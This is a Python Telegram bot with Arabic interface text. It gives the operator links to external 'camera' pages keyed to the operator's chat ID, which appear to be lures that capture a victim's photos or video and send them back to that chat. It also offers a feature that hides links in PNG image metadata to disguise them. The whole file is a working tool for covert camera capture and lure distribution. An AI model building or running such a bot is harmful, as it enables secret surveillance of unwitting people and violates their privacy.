import telebot
from telebot import types
import os
from PIL import Image, PngImagePlugin

# --- إعدادات البوت السرية ---
raw_token = os.getenv("BOT_TOKEN")
BOT_TOKEN = raw_token.strip() if raw_token else None

if not BOT_TOKEN:
    raise ValueError("❌ خطأ: لم يتم العثور على متغير BOT_TOKEN في إعدادات السيرفر!")

bot = telebot.TeleBot(BOT_TOKEN)

PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId/"

user_states = {}
user_data = {}

# 🔒 مكتبة المعرفات الثابتة المصححة والمنظفة 100%
GIRLS_LIBRARY = {
    "مقطع 1": "CQACAgQAAxkBAAII_2okuG-TG1NdVpdf5Gghet44v1JEAAK2JQACEHghUQEFWwXubmDOwQ",
    "مقطع 2": "CQACAgQAAxkBAAIJAWokuHdBxmA_tR0Lg3GxYB9BXfTRAAK3JQACEHghUWIoUPZPN7yXOwQ",
    "مقطع 3": "CQACAgQAAxkBAAIJA2okuH4NvntrcUNVEhaUIDfcflu0AAK4JQACEHghUR1XRVx3TsCEOwQ",
    "مقطع 4": "CQACAgQAAxkBAAIJBWokuISG_4HJnBhwqXzELXU7PhqqAAK5JQACEHghUQ0jvqyKLkrOwQ",
    "مقطع 5": "CQACAgQAAxkBAAIJB2okuT03fwOLKdwDdTsQXwM8ZBDAAK6JQACEHghUa0Rl_KtghuhOwQ",
    "مقطع 6": "CQACAgQAAxkBAAIJCWokuJqfDTIwuEZbB8QMXIURiJASAAK7JQACEHghUdRtAyYbafwlOwQ",
    "مقطع 7": "CQACAgQAAxkBAAIJC2okuKMY-6AXZEDIGb6LA6hSzKwyAAK9JQACEHghURUXhvDfiAFlOwQ",
    "مقطع 8": "CQACAgQAAxkBAAIJDwokuK9w8qUAAekjE7Uej99wAAG4zqwaAr4IAAIQeCFR2nFUXBS-MvE7BA",
    "مقطع 9": "CQACAgQAAxkBAAIJD2okuMGDIGHNzK02YdZTlwpkSeQwAAK_JQACEHghUdPja0O9dFPKOwQ",
    "مقطع 10": "CQACAgQAAxkBAAIJEWokuM1eVFK3DCN6TarnYudZsm_jAALAJQACEHghUT5dv0QoiE48OwQ"
}

# --- دالة حقن الرابط في الصورة ---
def hide_link_in_metadata(image_path, link, output_path):
    img = Image.open(image_path).convert("RGB")
    meta = PngImagePlugin.PngInfo()
    meta.add_text("URL_LINK", link)
    img.save(output_path, "PNG", pnginfo=meta)

# --- واجهة البوت ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    bot.send_message(message.chat.id, "أهلاً المطور سيف الدين، اختر الخدمة:", reply_markup=markup)

# --- معالجة الأزرار ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id

    if call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        bot.edit_message_text("أرسل الصورة الآن لحقن الرابط:", chat_id, call.message.message_id)
    
    elif call.data in ["get_photo_link", "get_video_link"]:
        link = f"{PHOTO_PAGE_URL}?chatId={chat_id}" if call.data == "get_photo_link" else f"{VIDEO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🔗 الرابط المطلوب:\n{link}")
    
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        for name in GIRLS_LIBRARY.keys():
            markup.add(types.InlineKeyboardButton(name, callback_data=f"play:{name}"))
        bot.edit_message_text("اختر المقطع:", chat_id, call.message.message_id, reply_markup=markup)
        
    elif call.data.startswith("play:"):
        name = call.data.split(":")[1]
        file_id = GIRLS_LIBRARY.get(name)
        
        try:
            bot.send_voice(chat_id, file_id)
        except Exception as e:
            # تم تعديل إرسال التنبيه ليظهر بشكل نصي واضح عند حدوث مشكلة في تليجرام
            bot.answer_callback_query(call.id, f"❌ تليجرام يرفض معرف المقطع: {name}")

# --- المعالج العام (صور، نصوص) ---
@bot.message_handler(content_types=['photo', 'text'])
def handle_all(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    
    # معالجة الحقن (خطوة 1: استلام الصورة)
    if state == "waiting_for_image_inject" and message.photo:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        img_path = f"img_{chat_id}.png"
        with open(img_path, 'wb') as f: f.write(downloaded)
        user_data[chat_id] = img_path
        user_states[chat_id] = "waiting_for_link"
        bot.reply_to(message, "تم حفظ الصورة، أرسل الرابط الآن:")

    # معالجة الحقن (خطوة 2: استلام الرابط)
    elif state == "waiting_for_link" and message.text:
        img_path = user_data.get(chat_id)
        out_path = f"out_{chat_id}.png"
        hide_link_in_metadata(img_path, message.text, out_path)
        with open(out_path, 'rb') as f:
            bot.send_photo(chat_id, f, caption=f"{message.text}")
        user_states[chat_id] = None
        if os.path.exists(img_path): os.remove(img_path)
        if os.path.exists(out_path): os.remove(out_path)

if __name__ == '__main__':
    bot.polling(none_stop=True, interval=0, timeout=20)
